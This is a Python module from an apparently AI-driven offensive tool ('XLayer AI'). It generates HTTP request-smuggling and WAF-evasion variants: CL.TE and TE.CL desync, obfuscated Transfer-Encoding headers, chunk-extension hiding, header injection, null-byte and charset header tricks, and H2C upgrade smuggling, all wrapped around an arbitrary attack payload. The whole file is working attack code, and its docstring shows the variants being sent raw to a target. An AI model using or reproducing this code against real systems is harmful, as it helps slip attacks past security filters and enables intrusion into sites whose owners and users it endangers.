"""
Protocol Evasion — HTTP/2 Smuggling & Request Fragmentation

XLayer AI bypasses WAFs not just at payload level but at PROTOCOL level.
This module implements:
  1. Request Fragmentation — split payload across multiple chunks
  2. Transfer-Encoding tricks — CL vs TE desync
  3. Header manipulation — case mixing, extra whitespace, null bytes
  4. HTTP/2 specific attacks (H2C smuggling)

Usage in Solver:
    from xlayer_ai.tools.protocol_evasion import ProtocolEvasion
    evasion = ProtocolEvasion()
    variants = evasion.generate_smuggling_variants(payload, target_url)
    for variant in variants:
        response = await http_client.send_raw(variant)
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional
from loguru import logger


@dataclass
class SmugglingVariant:
    """A request variant designed to bypass WAF/IDS at protocol level."""
    name: str                          # descriptive name
    raw_request: str                   # raw HTTP request bytes (as string)
    technique: str                     # "cl_te", "te_cl", "te_te", "h2c", etc.
    description: str = ""              # what this variant does
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""


class ProtocolEvasion:
    """
    Protocol-level WAF evasion techniques.

    These bypass WAF signature matching by exploiting differences
    in how the WAF and the backend server parse HTTP requests.
    """

    def generate_smuggling_variants(
        self,
        payload: str,
        target_url: str,
        target_path: str = "/",
        method: str = "POST",
    ) -> List[SmugglingVariant]:
        """
        Generate protocol-level evasion variants for a given payload.

        Args:
            payload: The attack payload to smuggle
            target_url: Target URL (for Host header)
            target_path: Request path
            method: HTTP method

        Returns:
            List of SmugglingVariant objects to try
        """
        host = self._extract_host(target_url)
        variants = []

        # 1. CL.TE Smuggling (Content-Length vs Transfer-Encoding desync)
        variants.append(self._cl_te_variant(payload, host, target_path))

        # 2. TE.CL Smuggling (reverse desync)
        variants.append(self._te_cl_variant(payload, host, target_path))

        # 3. TE.TE Smuggling (obfuscated Transfer-Encoding)
        variants.extend(self._te_te_variants(payload, host, target_path))

        # 4. Chunked encoding with payload hidden in chunk size/extension
        variants.append(self._chunked_smuggle(payload, host, target_path))

        # 5. Header injection / CRLF
        variants.append(self._header_injection(payload, host, target_path))

        # 6. HTTP/2 → HTTP/1.1 downgrade (H2C smuggling)
        variants.append(self._h2c_smuggle(payload, host, target_path))

        return [v for v in variants if v is not None]

    def generate_header_evasion(
        self, payload: str, parameter: str
    ) -> List[Dict[str, str]]:
        """
        Generate header-level evasion techniques.

        Returns list of modified header sets that may bypass WAF header inspection.
        """
        evasions = []

        # 1. Extra whitespace in header values
        evasions.append({
            "Content-Type": "application/x-www-form-urlencoded",
            parameter: f"  {payload}  ",
        })

        # 2. Case-mixed Content-Type
        evasions.append({
            "Content-Type": "APPLICATION/X-WWW-FORM-URLENCODED",
            "content-type": "text/plain",  # duplicate header
        })

        # 3. Null byte in header
        evasions.append({
            "X-Custom": f"normal\x00{payload}",
        })

        # 4. Overlong UTF-8 encoding in headers
        evasions.append({
            "Content-Type": "application/x-www-form-urlencoded; charset=ibm037",
        })

        # 5. Multiple Content-Type headers (some WAFs only check first)
        evasions.append({
            "Content-Type": "text/plain",
            "CONTENT-TYPE": "application/json",
        })

        return evasions

    def fragment_payload(self, payload: str, chunk_size: int = 3) -> str:
        """
        Fragment a payload into chunked Transfer-Encoding.

        WAFs may not reassemble chunks before inspection.
        Backend servers always reassemble → payload executes.
        """
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    # ── Smuggling Variants ────────────────────────────────────────────

    def _cl_te_variant(self, payload: str, host: str, path: str) -> SmugglingVariant:
        """
        CL.TE: Frontend (WAF) uses Content-Length, Backend uses Transfer-Encoding.

        WAF reads Content-Length bytes → thinks request is clean.
        Backend reads chunked body → finds hidden smuggled request.
        """
        smuggled = f"0\r\n\r\nPOST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"
        visible_body = f"0\r\n\r\n"

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(visible_body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{smuggled}"
        )

        return SmugglingVariant(
            name="CL.TE Desync",
            raw_request=raw,
            technique="cl_te",
            description="Frontend reads CL (short), backend reads TE (finds smuggled request)",
        )

    def _te_cl_variant(self, payload: str, host: str, path: str) -> SmugglingVariant:
        """
        TE.CL: Frontend (WAF) uses Transfer-Encoding, Backend uses Content-Length.

        WAF reads chunks → thinks request ends at 0 chunk.
        Backend reads Content-Length bytes → includes smuggled content.
        """
        body_prefix = f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"
        real_cl = len(body_prefix) + 50

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: {real_cl}\r\n"
            f"\r\n"
            f"{body_prefix}"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n\r\n"
        )

        return SmugglingVariant(
            name="TE.CL Desync",
            raw_request=raw,
            technique="te_cl",
            description="Frontend reads TE (stops at 0 chunk), backend reads CL (includes smuggled)",
        )

    def _te_te_variants(self, payload: str, host: str, path: str) -> List[SmugglingVariant]:
        """
        TE.TE: Obfuscated Transfer-Encoding header.

        Some servers accept obfuscated TE, others don't → desync.
        """
        obfuscations = [
            ("Transfer-Encoding: chunked\r\nTransfer-encoding: x", "duplicate_te"),
            ("Transfer-Encoding : chunked", "space_before_colon"),
            ("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", "chunked_identity"),
            ("Transfer-Encoding:\tchunked", "tab_separator"),
            ("Transfer-Encoding: xchunked", "prefix_x"),
            ("Transfer-Encoding: chunked\r\n X: ignored", "continuation_line"),
        ]

        variants = []
        chunked_body = self.fragment_payload(payload, chunk_size=5)

        for te_header, technique in obfuscations:
            raw = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            variants.append(SmugglingVariant(
                name=f"TE.TE ({technique})",
                raw_request=raw,
                technique=f"te_te_{technique}",
                description=f"Obfuscated TE: {technique}",
            ))

        return variants

    def _chunked_smuggle(self, payload: str, host: str, path: str) -> SmugglingVariant:
        """Hide payload in chunk extensions (ignored by most parsers)."""
        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"2;{payload[:20]}\r\n"
            f"OK\r\n"
            f"{len(payload):x}\r\n"
            f"{payload}\r\n"
            f"0\r\n\r\n"
        )
        return SmugglingVariant(
            name="Chunked Extension Smuggle",
            raw_request=raw,
            technique="chunk_extension",
            description="Payload hidden in chunk extension field",
        )

    def _header_injection(self, payload: str, host: str, path: str) -> SmugglingVariant:
        """CRLF injection in header value to inject additional headers."""
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Custom: innocent\r\n"
            f"X-Injected: {payload}\r\n"
            f"\r\n"
        )
        return SmugglingVariant(
            name="Header Injection",
            raw_request=raw,
            technique="header_injection",
            description="Additional headers with payload",
        )

    def _h2c_smuggle(self, payload: str, host: str, path: str) -> Optional[SmugglingVariant]:
        """HTTP/2 cleartext upgrade smuggling."""
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {payload[:100]}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"\r\n"
        )
        return SmugglingVariant(
            name="H2C Upgrade Smuggle",
            raw_request=raw,
            technique="h2c",
            description="HTTP/2 cleartext upgrade — may bypass WAF HTTP/1.1 inspection",
        )

    @staticmethod
    def _extract_host(url: str) -> str:
        """Extract host from URL."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        return parsed.netloc or parsed.hostname or "localhost"
